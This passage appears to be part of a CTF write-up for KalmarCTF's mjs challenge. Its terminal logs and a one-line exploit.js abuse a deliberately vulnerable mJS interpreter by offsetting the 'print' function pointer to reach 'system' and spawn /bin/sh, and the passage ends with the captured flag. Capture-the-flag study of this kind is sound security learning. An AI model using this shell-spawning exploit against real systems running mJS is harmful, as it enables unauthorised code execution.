<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:46:33 $ python -c <span class="string">&quot;print(0x0040cbb0-0x00405920)&quot;</span></span><br><span class="line">29328</span><br><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:46:38 $ ./mjsvuln -e <span class="string">&#x27;let f= (print+29328)(&quot;int system(char *)&quot;);&#x27;</span></span><br><span class="line">&lt;???-562949926229504&gt;</span><br></pre></td></tr></table></figure>

<p>Then I can just called <code>/bin/sh</code> and got the shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:46:40 $ ./mjsvuln -e &#x27;let f= (print+29328)(&quot;int system(char *)&quot;);f(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">$ ls</span><br><span class="line">Dockerfile  README.txt  diff.patch  exploit.js  mjs  mjs_src  mjsvuln  remote.py  source  ynetd</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h1 id="0x2-final-exploit"><a href="#0x2-final-exploit" class="headerlink" title="0x2 final exploit"></a>0x2 final exploit</h1><p>offset is little different in the original binary</p>
<p>exploit.js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let f= (print+27312)(&quot;int system(char *)&quot;);f(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>

<h1 id="0x3-flag"><a href="#0x3-flag" class="headerlink" title="0x3 flag"></a>0x3 flag</h1><p><code>kalmar&#123;mjs_brok3ey_565591da7d942fef817c&#125;</code></p>
]]></content>
  </entry>
</search>
